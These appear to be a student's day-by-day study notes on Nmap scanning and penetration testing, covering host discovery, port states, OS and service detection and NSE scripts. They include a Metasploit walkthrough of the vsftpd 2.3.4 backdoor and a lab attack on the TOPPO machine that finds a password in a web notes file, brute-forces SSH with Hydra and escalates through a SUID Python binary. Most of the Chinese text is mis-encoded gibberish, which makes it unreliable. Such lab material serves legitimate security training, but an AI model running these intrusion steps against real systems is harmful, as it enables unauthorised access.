  -PA  TCP ACK æ‰«æ
 nmap -PA 192.168.4.238
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-25 10:21 CST
Nmap scan report for 192.168.4.238
Host is up (0.0064s latency).
Not shown: 983 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
135/tcp   open  msrpc
443/tcp   open  https
445/tcp   open  microsoft-ds
902/tcp   open  iss-realsecure
912/tcp   open  apex-mesh
1025/tcp  open  NFS-or-IIS
1026/tcp  open  LSA-or-nterm
1027/tcp  open  IIS
1028/tcp  open  unknown
1034/tcp  open  zincite-a
1038/tcp  open  mtqp
1039/tcp  open  sbl
3389/tcp  open  ms-wbt-server
5800/tcp  open  vnc-http
5900/tcp  open  vnc
15000/tcp open  hydap

-PU  UDPæ‰«æ
-PY  ä½¿ç”¨sctpåè®®æ‰«æ
nmap -PY21  192.168.4.238
æµæ§åˆ¶ä¼ è¾“åè®®ï¼ˆSCTPï¼ŒStream Control Transmission Protocolï¼‰æ˜¯ä¸€ç§åœ¨ç½‘ç»œè¿æ¥ä¸¤ç«¯ä¹‹é—´åŒæ—¶ä¼ è¾“å¤šä¸ªæ•°æ®æµçš„åè®®ã€‚SCTPæä¾›çš„æœåŠ¡ä¸UDPå’ŒTCPç±»ä¼¼ã€‚

 nmap -PA21,22 192.168.4.238
 nmap -PA21-22 192.168.4.238
 nmap -PA21-22,80 192.168.4.238


ä¸»æœºå‘ç°çš„å…¶ä»–é€‰é¡¹
ï¼ˆ1ï¼‰
--traceroute: Trace hop path to each host

æ¢æµ‹åˆ°è¾¾ä¸»æœºçš„è·¯å¾„
nmap -sn --traceroute 163.com  www.sdxhce.com

ï¼ˆ2ï¼‰
ä½¿ç”¨nseæ¢æµ‹ä¸»æœºå­˜æ´»

nmapçš„è„šæœ¬å¼•æ“ï¼ˆNSEï¼‰é»˜è®¤ç›®å½• /usr/share/nmap/scripts
nmapçš„è„šæœ¬å¼•æ“æ–‡ä»¶çš„æ‰©å±•å*.nse
--script

nmap -sn --script dns-brute qq.com

dns-brute  å­åŸŸåçš„çˆ†ç ´


nmap -sn --script broadcast-ping 192.168.0.1/24

broadcast-ping ä½¿ç”¨å¹¿æ’­pingæ¢æµ‹ä¸»æœºå­˜æ´»


ï¼ˆ3ï¼‰icmpæ¢æµ‹
-PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes

-PE icmp echoè¯·æ±‚
-PP icmp æ—¶é—´æˆ³è¯·æ±‚
-PM icmp  å­ç½‘æ©ç è¯·æ±‚

ï¼ˆ4ï¼‰-PO ä½¿ç”¨æŒ‡å®šçš„åè®®æ¢æµ‹

### 55 day

port scanningï¼ˆç«¯å£æ‰«æï¼‰
ï¼ˆ1ï¼‰å¼€æ”¾äº†å“ªäº›ç«¯å£ï¼ˆç«¯å£çš„çŠ¶æ€ï¼‰
ï¼ˆ2ï¼‰ç«¯å£å¯¹åº”ä»€ä¹ˆæœåŠ¡åŠå…¶æœåŠ¡çš„ç‰ˆæœ¬

nmap -v -A scanme.nmap.org


nmap --dns-servers 8.8.8.8,8.8.4.4 scanme.nmap.org

--dns-servers  æŒ‡å®šDNSæœåŠ¡å™¨

Nmap categorizes ports into the following states:
Nmapå¯¹äºç«¯å£çŠ¶æ€çš„åˆ†ç±»ï¼š
â€¢ Open: Open indicates that a service is listening for connections on this port.
//å¼€æ”¾ï¼Œä¸€ä¸ªæœåŠ¡åœ¨è¿è¡Œï¼ˆç›‘å¬ï¼‰ï¼Œå¯ä»¥å»ºç«‹è¿æ¥

â€¢ Closed: Closed indicates that the probes were received, but it was concluded that
there was no service running on this port.
//å…³é—­ï¼Œæ²¡æœ‰æœåŠ¡åœ¨è¯¥ç«¯å£è¿è¡Œ
â€¢ Filtered: Filtered indicates that there were no signs that the probes were received
and the state could not be established. This could indicate that the probes are being
dropped by some kind of filtering.
//è¿‡æ»¤ï¼Œæ²¡æœ‰æ”¶åˆ°probesï¼ˆæ¢é’ˆï¼‰ï¼Œä¸èƒ½å»ºç«‹è¿æ¥ï¼ˆçŠ¶æ€ï¼‰ï¼Œå¯èƒ½å‰ç«¯æœ‰é˜²ç«å¢™

â€¢ Unfiltered: Unfiltered indicates that the probes were received but a state could not
be established.
//æœªè¿‡æ»¤ï¼Œæ”¶åˆ°äº†probesï¼Œä½†ä¸èƒ½å»ºç«‹è¿æ¥ï¼ˆçŠ¶æ€ï¼‰

â€¢ Open/Filtered: This indicates that the port was filtered or open but the state could
not be established.
å¼€æ”¾/è¿‡æ»¤ï¼Œç«¯å£å¯èƒ½è¢«è¿‡æ»¤äº†æˆ–è€…ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œä½†ä¸èƒ½å»ºç«‹è¿æ¥

â€¢ Closed/Filtered: This indicates that the port was filtered or closed but the state
could not be established.

å…³é—­/è¿‡æ»¤ï¼Œç«¯å£å¯èƒ½è¢«è¿‡æ»¤äº†æˆ–è€…ç«¯å£æ˜¯å…³é—­çš„ï¼Œä¸èƒ½å»ºç«‹è¿æ¥




phpStudy---å¿«é€Ÿå»ºç«™ï¼ˆWNMPæˆ–WAMPï¼‰
	LNMP

nmap -Pn scanme.nmap.org
-Pn  
	è·³è¿‡ä¸»æœºå‘ç°ï¼Œç›´æ¥æ‰«æ
nmap -n scanme.nmap.org
	-n  ç¦ç”¨DNSè§£æï¼ˆé»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šå°è¯•ç”¨DNSåå‘è§£æIPåœ°å€ï¼‰


a SYN stealth scan or a TCP connect scan


SYN stealth scan  synç§˜å¯†æ‰«æï¼Œä¹Ÿç§°ä¸ºåŠå¼€è¿æ¥æ‰«æ 
ä¹Ÿæ˜¯é»˜è®¤æ‰«æç±»å‹ï¼Œå¯¹åº”çš„é€‰é¡¹ä¸º-sS
æ™®é€šç”¨æˆ·æ˜¯ä¸èƒ½æ‰§è¡Œç§˜å¯†æ‰«æï¼ˆï¼‰
â”Œâ”€â”€(xiaofeixiaã‰¿kali2)-[~]
â””â”€$ nmap -Pn  -sS -p3389 192.168.195.70
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
You requested a scan type which requires root privileges.
QUITTING!


TCP connect scan å®Œå…¨è¿æ¥æ‰«æ ï¼ˆä¸‰æ¬¡æ¡æ‰‹æ˜¯å®Œæ•´çš„ï¼‰
å¯¹åº”çš„é€‰é¡¹ä¸º-sT

nmapçš„é»˜è®¤æ‰«æè¡Œä¸º
nmap <ç›®æ ‡>  
1ï¼‰å…ˆDNSè§£æ   ï¼ˆ-nï¼‰
2ï¼‰æ£€æŸ¥ä¸»æœºæ˜¯å¦å­˜æ´»  ï¼ˆ-Pnï¼‰
3ï¼‰æ‰«æç±»å‹ä¸ºSYNæ‰«æï¼ˆç§˜å¯†æ‰«æ -sSï¼‰
   ä½†å¦‚æœæ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·æ‰§è¡Œï¼Œåˆ™æ‰§è¡Œçš„æ˜¯å®Œå…¨è¿æ¥æ‰«æï¼ˆ-sTï¼‰
4ï¼‰é»˜è®¤æ‰«æçš„ç«¯å£æ˜¯ä¸€äº›å¸¸ç”¨çš„æœåŠ¡ç«¯å£

Nmapçš„ç«¯å£æŒ‡å®šæŠ€å·§
 Scanning specific port ranges æŒ‡å®šæ‰«æçš„ç«¯å£èŒƒå›´
 -p 
 
 Port list separated by commas: $ nmap -p80,443 ç›®æ ‡   //ç«¯å£åˆ—è¡¨
 
 nmap -p1-100 ç›®æ ‡  //ç«¯å£èŒƒå›´
 
 Alias for all ports from 1 to 65535: # nmap -p- localhost  //æ‰€æœ‰ç«¯å£ï¼ˆ1 to 65535ï¼‰
 
 Specific ports by protocol: # nmap -pT:25,U:53 <target>  //æŒ‡å®šç«¯å£çš„åè®®
 
 Service name: # nmap -p smtp <target> //ä½¿ç”¨æœåŠ¡åç§°
 
 nmap -Pn -p ftp 192.168.195.29
 
 Service name with wildcards: # nmap -p smtp* <target> //æŒ‡å®šæœåŠ¡åç§°æ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨é€šé…ç¬¦

 â”Œâ”€â”€(rootğŸ’€kali2)-[~]
â””â”€# nmap -Pn -p ftp* 192.168.195.29
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-26 11:37 CST
Nmap scan report for 192.168.195.29
Host is up (0.00026s latency).

PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   open   ftp
574/tcp  closed ftp-agent
989/tcp  closed ftps-data
990/tcp  closed ftps
8021/tcp closed ftp-proxy

Only ports registered in the Nmap services database: 
# nmap  -p[1-65535] <target> //ä»…æ‰«æåœ¨NmapæœåŠ¡æ•°æ®åº“ä¸­æ³¨å†Œçš„ç«¯å£

 ### 56 day
56.1. æŒ‡å®šç½‘ç»œæ¥å£
 -e

nmap -e eth1 ç›®æ ‡
 
 56.2. ç›®æ ‡çš„æŒ‡å®š
 
 TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -iL <inputfilename>: Input from list of hosts/networks
  -iR <num hosts>: Choose random targets
  --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
  --excludefile <exclude_file>: Exclude list from file

 nmap -p25,80 -O -T4 192.168.1.1/24 scanme.nmap.org/24
 
 å¤šä¸ªç›®æ ‡ç”¨ç©ºæ ¼åˆ†éš”ï¼Œå¦‚æœNmapä¸è¯†åˆ«çš„é€‰é¡¹éƒ½è®¤ä¸ºæ˜¯æ½œåœ¨çš„ç›®æ ‡
 ï¼ˆ1ï¼‰ä¸»æœºå  scanme.nmap.org
 ï¼ˆ2ï¼‰CIDR    192.168.1.1/24
              scanme.nmap.org/24  ï¼ˆCæ®µæ¸—é€æ”»å‡»ï¼‰
			  
  nmap -p80 111.161.126.0/24
 ï¼ˆ3ï¼‰å•ä¸ªä¸»æœº
 ï¼ˆ4ï¼‰10.0.0-255.1-254
      10.0.0.1-254
      10.0.1.1-254
      10.0.2.1-254
	  
	  10.0.255.1-254
	  
	  nmap -sn 192.168.0-10.1-254
  ï¼ˆ5ï¼‰èŒƒå›´
  nmap -sn 192.168.195.160 192.168.195.161 192.168.195.162 192.168.195.163
  nmap -sn 192.168.195.160-163 
  nmap -sn 192.168.195.* 
  nmap -sn 192.168.195.0/24  
  ï¼ˆ6ï¼‰æ’é™¤ï¼ˆexcludeï¼‰æŒ‡å®šçš„ä¸»æœº Excluding hosts from scans
  nmap -sn 192.168.195.* --exclude 192.168.195.1,192.168.195.6
  
  nmap -sn 192.168.195.* --exclude 192.168.195.1-2,192.168.195.254

 ï¼ˆ7ï¼‰æ’é™¤æ¥è‡ªæŒ‡å®šæ–‡ä»¶ä¸­çš„ä¸»æœº
  --excludefile
  
  ï¼ˆ8ï¼‰æ‰«ææ¥è‡ªæŒ‡å®šæ–‡ä»¶ä¸­ä¸»æœº
    -iL 
	
	nmap -Pn -p80 --open -iL local_ip.txt
	
	--open  åªåˆ—å‡ºå¼€æ”¾çš„ç«¯å£çš„ä¸»æœº
ï¼ˆ9ï¼‰-iR
    éšæœºæŒ‡å®šä¸€å®šæ•°é‡ä¸»æœºæ‰«æ
  
  
 56.3 Fingerprinting OSes and services running on a target
 
 æ“ä½œç³»ç»Ÿå’ŒæœåŠ¡ç‰ˆæœ¬çš„æ£€æµ‹
 äº†è§£æ“ä½œç³»ç»Ÿå’ŒæœåŠ¡çš„ç¡®åˆ‡è½¯ä»¶ç‰ˆæœ¬å¯¹äºå¯»æ‰¾å®‰å…¨æ¼æ´çš„äººæ¥è¯´éå¸¸æœ‰ä»·å€¼
 
 nmap -sV ç›®æ ‡
	æœåŠ¡ç‰ˆæœ¬çš„æ£€æµ‹
 nmap -O  ç›®æ ‡
	æ“ä½œç³»ç»Ÿçš„æ£€æµ‹
Step1  nmap -p21 -sV -O 192.168.195.29

 21/tcp open  ftp     vsftpd 2.3.4
 OS CPE: cpe:/o:linux:linux_kernel:2.6
Step02 æŸ¥æ‰¾æ¼æ´

https://www.exploit-db.com/  æ¼æ´åˆ©ç”¨æ•°æ®åº“

åˆ©ç”¨searchsploitå·¥å…·æŸ¥æ‰¾æ¼æ´åˆ©ç”¨æ•°æ®åº“

 searchsploit vsftpd 2.3.4

Step03 æ¼æ´åˆ©ç”¨
å·¥å…·ï¼šMetasploit

1ï¼‰æŸ¥æ‰¾æ¼æ´åˆ©ç”¨æ¨¡å—
  search vsftpd
2ï¼‰è°ƒç”¨æ¨¡å—
   use  åç§°
   æˆ–
   use  ç¼–å· 
   use exploit/unix/ftp/vsftpd_234_backdoor
   info   æŸ¥çœ‹æ¨¡å—çš„ä¿¡æ¯

   
3ï¼‰æŸ¥çœ‹æ¨¡å—çš„é€‰é¡¹
show options

RHOSTS ---è¿œç¨‹ä¸»æœº

4ï¼‰è®¾ç½®é€‰é¡¹
	set  é€‰é¡¹åç§°  å€¼
	
	unset é€‰é¡¹åç§°   å–æ¶ˆé€‰é¡¹ç›¸åº”çš„å€¼ 
5ï¼‰æ¼æ´åˆ©ç”¨
exploit

python -c 'import pty;pty.spawn("/bin/bash")'  è·å¾—äº¤äº’å¼shell

 ### 57 day 

æ“ä½œç³»ç»Ÿæ£€æµ‹

-O  

æ£€æµ‹ç½‘ç»œä¸­å¼€æ”¾3389ç«¯å£çš„ä¸»æœº

nmap -p3389 --open 192.168.195.0/24


è¿œç¨‹æ¡Œé¢æœåŠ¡  3389

ç¡®å®šç›®æ ‡æ“ä½œç³»ç»Ÿçš„ç±»å‹

nmap -O 192.168.195.81  *****

çŒœæµ‹å¯¹æ–¹ä¸»æœºå¯èƒ½å­˜åœ¨MS12-020 ï¼ˆè¿œç¨‹æ¡Œé¢æœåŠ¡çš„ä¸€ä¸ªæ¼æ´ï¼‰

åœ¨metasploitä¸­è¿›è¡Œæ¼æ´çš„åˆ©ç”¨
search MS12-020

-sV æœåŠ¡ç‰ˆæœ¬æ£€æµ‹  *****
	è¯†åˆ«å®‰å…¨æ¼æ´ã€ç¡®ä¿æœåŠ¡åœ¨ç»™å®šç«¯å£ä¸Šè¿è¡Œã€æ£€æŸ¥è¡¥ä¸æˆ–æ›´æ–°åŒ…æ˜¯å¦å·²æˆåŠŸåº”ç”¨ã€‚
 -sV: Probe open ports to determine service/version info
  --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
  --version-light: Limit to most likely probes (intensity 2)
  --version-all: Try every single probe (intensity 9)
  --version-trace: Show detailed version scan activity (for debugging)


-O  æ“ä½œç³»ç»Ÿæ£€æµ‹

nmap -O 192.168.195.81             
TCP/IP fingerprinting (for OS scan) requires root privileges.
//éœ€è¦rootæƒé™
attempt OS detection by sending several probes
to the TCP, UDP, and ICMP protocols against opened and closed ports. 
//ä½¿ç”¨TCPã€UDPã€ICMPå‘é€å¤šç§æ¢é’ˆåˆ°æŒ‡å®šçš„ç«¯å£ï¼ˆå¼€æ”¾çš„æˆ–å…³é—­çš„ï¼‰
//æ“ä½œç³»ç»Ÿæ£€æµ‹åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œæ”¯æŒä¸»æµæ“ä½œç³»ç»Ÿçš„æ£€æµ‹ï¼Œä¹Ÿæ”¯æŒå®¶ç”¨è·¯ç”±å™¨ã€æ‘„åƒå¤´ã€å…¶ä»–çš„ç¡¬ä»¶è®¾å¤‡æ“ä½œç³»ç»Ÿçš„æ£€æµ‹
CPEå…¨ç§°æ˜¯Common Platform Enumerationï¼Œé€šç”¨å¹³å°æšä¸¾ã€‚å®ƒæ˜¯å¯¹è¯†åˆ«å‡ºæ¥çš„æ“ä½œç³»ç»Ÿçš„ä¸€ç§å‘½åæ–¹å¼
å…¶ä»–é€‰é¡¹

å¯¹æœåŠ¡ç‰ˆæœ¬è¿›è¡Œæ·±åº¦æ£€æµ‹  --version-intensityï¼Œçº§åˆ«ä»0åˆ°9
nmap -sV --version-intensity 9 <target>


Aggressive detection mode---ç§¯ææ£€æµ‹æ¨¡å¼*****
-Aï¼ŒåŒ…å«ä»¥ä¸‹æ£€æµ‹
enables OS detection (-O),æ“ä½œç³»ç»Ÿæ£€æµ‹
 version detection (-sV), æœåŠ¡ç‰ˆæœ¬æ£€æµ‹
 script scanning (-sC), é»˜è®¤çš„è„šæœ¬æ£€æµ‹
traceroute (--traceroute) è·¯ç”±è·Ÿè¸ª


If OS detection fails, you can use --osscan-guess to force Nmap to guess the OS:
å¦‚æœæ“ä½œç³»ç»Ÿæ£€æµ‹å¤±è´¥ï¼Œå¯ä»¥åŠ ä¸Š --osscan-guess è®©Nmapå»çŒœæµ‹æ“ä½œç³»ç»Ÿçš„ç±»å‹
nmap -O --osscan-guess <target>



57.2 Nmapçš„é˜¶æ®µå®æˆ˜-TOPPOé¶æœº

1. ä¿¡æ¯æ¢æµ‹
arp-scan -l
nmap -A 192.168.195.162 
22
80
111

2. http://192.168.195.162
  é™æ€ç«™ç‚¹
3. å¯¹Webç«™ç‚¹è¿›è¡Œç›®å½•çš„æšä¸¾

ä½¿ç”¨nmapçš„http-enumè„šæœ¬å¼•æ“è¿›è¡ŒWebç«™ç‚¹ç›®å½•æšä¸¾

nmap --script http-enum 192.168.195.162

Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 10:57 CST
Nmap scan report for 192.168.195.162
Host is up (0.00012s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
| http-enum: 
|   /admin/: Possible admin folder
|   /mail/: Mail folder
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /manual/: Potentially interesting folder
|_  /vendor/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
111/tcp open  rpcbind
MAC Address: 00:0C:29:BC:F6:3C (VMware)


4. http://192.168.195.162/admin/notes.txt

curl "http://192.168.195.162/admin/notes.txt"  

curl  åŸºäºæ–‡æœ¬çš„æµè§ˆå™¨

å¾—åˆ°äº†ä¸€ä¸ªå¯†ç  12345ted123

è¿™æ˜¯è°çš„å¯†ç ï¼Ÿ

è”æƒ³åˆ°ä¹‹å‰çš„22ç«¯å£---å°è¯•å¯¹SSHè¿›è¡Œæš´åŠ›ç ´è§£
ç”¨æˆ·ä¿¡æ¯ï¼Ÿ
ï¼ˆ1ï¼‰å¯¹ç«™ç‚¹è¿›è¡Œä¿¡æ¯çš„æ”¶é›†åˆ¶ä½œç”¨æˆ·æˆ–å¯†ç æ–‡ä»¶  cewl
ï¼ˆ2ï¼‰åˆ©ç”¨è®°äº‹æœ¬æä¾›çš„ä¿¡æ¯åˆ¶ä½œç”¨æˆ·æ–‡ä»¶
12345
ted
ted123
123
5. æš´åŠ›ç ´è§£
hydra
hydra -L user.txt  -p 12345ted123 192.168.195.162 ssh    
6. SSHç™»å½•
ssh ted@192.168.195.162
7.ææƒä¹‹å‰
7.1. å……åˆ†çš„ä¿¡æ¯æ”¶é›†

uname -r
cat /etc/*-release
cat /etc/passwd

find / -perm -u=s -type f  2>/dev/null  //æŸ¥æ‰¾SUIDä½çš„æ–‡ä»¶
find / -perm -4000 -type f  2>/dev/null

/usr/bin/python2.7
		/usr/bin/python2.7 -c 'import pty;pty.spawn("/bin/sh")'
/usr/bin/mawk


 nmap -sP 192.168.195.0/24
 -sP  ç›´è¿ç½‘æ®µæ‰«æï¼Œå‘ç°æ´»åŠ¨ä¸»æœº

 ### 58 day 
 åŒä¸€ç½‘æ®µè·å–é¶æœºIPåœ°å€çš„æ–¹æ³•
 ï¼ˆ1ï¼‰arp-scan -l
 ï¼ˆ2ï¼‰nmap -sP 
 ï¼ˆ3ï¼‰nmap -sn
 ï¼ˆ4ï¼‰netdiscover -r 192.168.195.0/24
 ï¼ˆ5ï¼‰nbtscan 192.168.195.1-255
 
æ—¶åº
	-Tï¼ˆ0-5ï¼‰
	-T4
		
58.2. Using NSE scripts against a target host
ä½¿ç”¨NMAPçš„è„šæœ¬å¼•æ“å¯¹ç›®æ ‡ä¸»æœºæ‰«æ 
å¯¹NSEçš„ç†è§£
ï¼ˆ1ï¼‰æ‰©å±•Nmapçš„åŠŸèƒ½
ï¼ˆ2ï¼‰ä½¿ç”¨Lua scripts
åœ¨æ‰€æœ‰è„šæœ¬å¼•æ“ä¸­ï¼ŒLuaçš„é€Ÿåº¦æ˜¯æœ€å¿«çš„ã€‚è¿™ä¸€åˆ‡éƒ½å†³å®šäº†Luaæ˜¯ä½œä¸ºåµŒå…¥å¼è„šæœ¬çš„æœ€ä½³é€‰æ‹©
ï¼ˆ3ï¼‰Nmapè„šæœ¬ç›®å½•ã€€/usr/share/nmap/scripts
ï¼ˆ4ï¼‰nmap --script-updatedb  æ›´æ–°NSEçš„æ•°æ®åº“

 ls  /usr/share/nmap/scripts | awk -F .  '{print $1}' | sort >nmap_nse.list 
 
ï¼ˆ5ï¼‰ä½¿ç”¨ä¸»æœºå’Œç«¯å£è§„åˆ™ï¼Œå®ƒä»¬ç”šè‡³å¯ä»¥è¢«é…ç½®ä¸ºåœ¨æ²¡æœ‰ç«¯å£æ‰«æç›®æ ‡çš„æƒ…å†µä¸‹è¿è¡Œï¼Œè¿™åœ¨ä¾¦å¯Ÿä»»åŠ¡ä¸­éå¸¸æœ‰ç”¨ã€‚

SCRIPT SCAN:
  -sC: equivalent to --script=default
  --script=<Lua scripts>: <Lua scripts> is a comma separated list of
           directories, script-files or script-categories
  --script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts
  --script-args-file=filename: provide NSE script args in a file
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
  --script-help=<Lua scripts>: Show help about scripts.
           <Lua scripts> is a comma-separated list of script-files or
           script-categories.

ï¼ˆ6ï¼‰å¸¸ç”¨çš„è„šæœ¬å¼•æ“é€‰é¡¹

--script  è„šæœ¬çš„åç§°æˆ–è„šæœ¬çš„ç±»åˆ«
		  å¦‚æœæœ‰å¤šä¸ªè„šæœ¬ï¼Œè„šæœ¬ä¹‹é—´ç”¨é€—å·åˆ†éš”
ï¼ˆ7ï¼‰å¸¸ç”¨çš„è„šæœ¬ç±»åˆ«

ï¼ˆ8ï¼‰ç”¨æ³•

1ï¼‰nmap --script dns-brute <target>
2ï¼‰nmap --script http-headers,http-title scanme.nmap.org
3ï¼‰nmap -sV --script vuln <target>
4ï¼‰nmap -sV --script="version,discovery" <target>
5ï¼‰nmap -sV --script "not exploit" <target>
6ï¼‰nmap -sV --script "(http-*) and not(http-slowloris or http-brute)" <target>
//æ‰§è¡Œæ‰€æœ‰httpå¼€å¤´çš„è„šæœ¬ï¼Œä½†è¿™ä¸¤ä¸ªè„šæœ¬http-slowlorisã€http-bruteé™¤å¤–



### 59 day 

--script-help   æŸ¥çœ‹è„šæœ¬å¼•æ“çš„å¸®åŠ©

smb-vuln-ms08-067

SMBåè®®ï¼Œåˆç§°ä¸ºCIFSåè®®ï¼Œæ–‡ä»¶å…±äº«æ‰€ä½¿ç”¨çš„åè®®ï¼ˆå¦‚Windowsçš„å…±äº«ã€SambaæœåŠ¡ï¼‰
ä½¿ç”¨445ç«¯å£

MS08-067
CVE-2008-4250
nmap  --script smb-vuln-ms08-067 192.168.195.32

59.2 NSE script argumentsï¼ˆè„šæœ¬å¼•æ“å‚æ•°ï¼‰
--script-args
é€šè¿‡--script-argså°†å‚æ•°ä¼ é€’ç»™NSEè„šæœ¬
å‚æ•°çš„ç»“æ„ä¸ºï¼šname=valueï¼Œä»¥,åˆ†å‰²å¤šä¸ªå‚æ•°å¯¹
nameå’Œvalueä¸­éƒ½ä¸è¯¥è¯¥åŒ…å«å¦‚ä¸‹ç¬¦å·ï¼š{   }   ,  =

ä¸€äº›ç½‘ç«™ä¼šé€šè¿‡åˆ¤æ–­ user-agent æ¥åˆ¤æ–­è¯·æ±‚æ˜¯å¦åˆæ³•

nmap -p12380 -sV --script http-title --script-args http.useragent="IE 10" 192.168.195.166

å¯ä»¥ä½¿ç”¨script argument aliasesï¼ˆè„šæœ¬å‚æ•°çš„åˆ«åï¼‰

nmap -p80 --script http-trace --script-args http-trace.path  ç›®æ ‡
nmap -p80 --script http-trace --script-args path  ç›®æ ‡

--script-args-file=filename//è„šæœ¬çš„å‚æ•°æ¥è‡ªäºæŒ‡å®šçš„æ–‡ä»¶


nmap -p12380 -sV --script http-title --script-args-file=/root/work/exam/day59/http.txt 192.168.195.166

â”Œâ”€â”€(rootğŸ’€kali2)-[~/work/exam/day59]
â””â”€# cat http.txt
 http.useragent="IE 10"


59.3. Debugging NSE scripts è„šæœ¬çš„è°ƒè¯•å¼€å…³
--script-trace
 -d[1-9]
 debugging level è°ƒè¯•çº§åˆ«
 
https://github.com/cldrn/nmap-nsescripts

https://nmap.org/book/nse-usage.html#nse-args
https://nmap.org/nsedoc/scripts/http-title.html

nmap -sn -PE --packet-trace 192.168.4.238   

-PE  å‘é€çš„ICMPå›æ˜¾è¯·æ±‚
--packet-trace  å¯¹å‘é€çš„åŒ…è¿›è¡Œè·Ÿè¸ªæ¢æµ‹

nmap -sn -PE --packet-trace 192.168.4.238   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 11:03 CST
SENT (0.0519s) ICMP [192.168.195.76 > 192.168.4.238 Echo request (type=8/code=0) id=25102 seq=0] IP [ttl=51 id=38606 iplen=28 ]
RCVD (0.0526s) ICMP [192.168.4.238 > 192.168.195.76 Echo reply (type=0/code=0) id=25102 seq=0] IP [ttl=128 id=36617 iplen=28 ]

-PO  
é»˜è®¤ä½¿ç”¨icmpã€IGMPã€ipåè®®æ¢æµ‹ä¸»æœºå­˜æ´»
ä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰çš„åè®®
nmap -sn -PO1,2,17 --packet-trace 192.168.4.238
é»˜è®¤ä¸Šè¿°æŠ€æœ¯æ•°æ®æ˜¯ç©ºçš„ï¼Œå¯ä»¥é€šè¿‡--data-length æŒ‡å®šæ•°æ®é•¿åº¦
 nmap -sn -PO1,2,17 --data-length 100 192.168.4.238



â”Œâ”€â”€(rootğŸ’€kali2)-[~/work/exam/day59]
â””â”€# nmap -sn -PO --packet-trace 192.168.4.238
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 11:09 CST
SENT (0.0532s) ICMP [192.168.195.76 > 192.168.4.238 Echo request (type=8/code=0) id=24664 seq=0] IP [ttl=56 id=30386 iplen=28 ]
SENT (0.0533s) igmp (2) 192.168.195.76 > 192.168.4.238: ttl=53 id=27120 iplen=28 
SENT (0.0533s) ipv4 (4) 192.168.195.76 > 192.168.4.238: ttl=42 id=42167 iplen=20 
RCVD (0.0538s) ICMP [192.168.195.2 > 192.168.195.76 Protocol 2 unreachable (type=3/code=2) ] IP [ttl=128 id=36619 iplen=56 ]
RCVD (0.0538s) ICMP [192.168.195.2 > 192.168.195.76 Protocol 4 unreachable (type=3/code=2) ] IP [ttl=128 id=36620 iplen=48 ]
RCVD (0.0552s) ICMP [192.168.4.238 > 192.168.195.76 Echo reply (type=0/code=0) id=24664 seq=0] IP [ttl=128 id=36621 iplen=28 ]

### 60 day 

CHAP 14 ç†è§£å’Œæ£€æŸ¥æ— çº¿ç½‘ç»œ

ä»æ‚¨çš„ç³»ç»Ÿä¸­æ‰«æå¹¶è¿æ¥åˆ°å…¶ä»–ç½‘ç»œè®¾å¤‡çš„èƒ½åŠ›å¯¹äºæˆä¸ºä¸€åæˆåŠŸçš„é»‘å®¢è‡³å…³é‡è¦

ç¬¬ä¸€æ­¥æ˜¯å­¦ä¹ å¦‚ä½•æ‰¾åˆ°è¿™äº›è®¾å¤‡

1.æ— çº¿çš„æ¦‚å¿µ
ï¼ˆ1ï¼‰
AP æ— çº¿æ¥å…¥ç‚¹
SSID ç½‘ç»œçš„åç§°
ESSID 
BSSID å”¯ä¸€æ ‡è¯†æ¯ä¸ªAPï¼ŒAPçš„MACåœ°å€  Access Point: 88:C3:97:C2:F1:4E
ï¼ˆ2ï¼‰Wifiçš„å®‰å…¨åè®®
wep ä¸å®‰å…¨
WPA ç›¸å¯¹å®‰å…¨
WPA2-PSK æ›´ä¸ºå®‰å…¨ï¼Œæœ€å¸¸ç”¨
ï¼ˆ3ï¼‰Wifiçš„ä¸‰ç§æ“ä½œæ¨¡å¼
Manage  ç®¡ç† è¿™æ„å‘³ç€å®ƒå·²å‡†å¤‡å¥½åŠ å…¥æˆ–å·²åŠ å…¥ AP
Master  ä¸»è¦ masterï¼Œè¿™æ„å‘³ç€å®ƒå·²å‡†å¤‡å¥½å……å½“æˆ–å·²ç»åŠ å…¥ AP
Monitor  ç›‘è§†
ï¼ˆ4ï¼‰é¢‘ç‡
2.4GHZ
5GHZ


2.åŸºæœ¬æ— çº¿ç½‘ç»œå‘½ä»¤


wlan0  æ— çº¿ç½‘å¡çš„å‘½å
ï¼ˆ1ï¼‰iwconfig ä»…æ˜¾ç¤ºæ— çº¿ç½‘å¡åŠå…¶æ•°æ®

ï¼ˆ2ï¼‰ifconfig wlan0 up  å¯ç”¨æ— çº¿ç½‘å¡

systemctl start NetworkManager //å¯åŠ¨ç½‘ç»œç®¡ç†å™¨

ï¼ˆ3ï¼‰iwlist
å¦‚æœæ‚¨ä¸ç¡®å®šè¦è¿æ¥å“ªä¸€ä¸ª Wi-Fi APï¼Œå¯ä»¥ä½¿ç”¨ iwlist å‘½ä»¤æŸ¥çœ‹æ‚¨çš„ç½‘å¡å¯ä»¥è®¿é—®çš„æ‰€æœ‰æ— çº¿æ¥å…¥ç‚¹

iwlist æ¥å£  åŠ¨ä½œ
